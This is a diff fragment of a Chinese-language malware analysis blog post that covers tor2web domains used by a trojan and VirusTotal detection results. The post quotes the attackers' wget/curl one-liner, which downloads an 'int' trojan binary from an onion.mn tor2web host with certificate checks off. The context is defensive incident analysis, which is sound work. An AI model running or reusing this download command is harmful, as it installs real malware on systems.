@@ -93,13 +93,14 @@ fi
 * onion.nz
 * onion.glass
 * tor2web.su
+
 通过全网检这些三级域名，发现年中的时候有人中招了，文件名不同，但是手法很像，有兴趣可以查看我提供参考链接。下载木马客户端的用户名为当前时间的md5值，然后授权执行删除。
 具体使用wget或者curl请求下载int木马文件拼接案例语句如下：
 ```
 wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee4ac14e82501dc127890f75770c17   || curl -m10 -fsSLkA- trumps4c4ohxvq7o.onion.mn/int -o./e0ee4ac14e82501dc127890f75770c17
 ```
 将下载下来的int和crn文件进行分析，
-virustotal返回的结果是crn是安全的，int只有Ikarus和SentinelOne (Static ML)两个引擎判断为木马，可见这个木马病毒在绕过引擎检测方面下了大量功夫。
+virustotal返回的结果是crn是安全的，int只有Ikarus和SentinelOne (Static ML)两个引擎判断为木马，可见这个木马病毒在绕过引擎检测方面下了大量功夫。   
 crn检测结果：
 ![20191219-trojan-17.png](https://hksanduo.github.io/images/20191219-trojan-17.png)
 int检测结果：
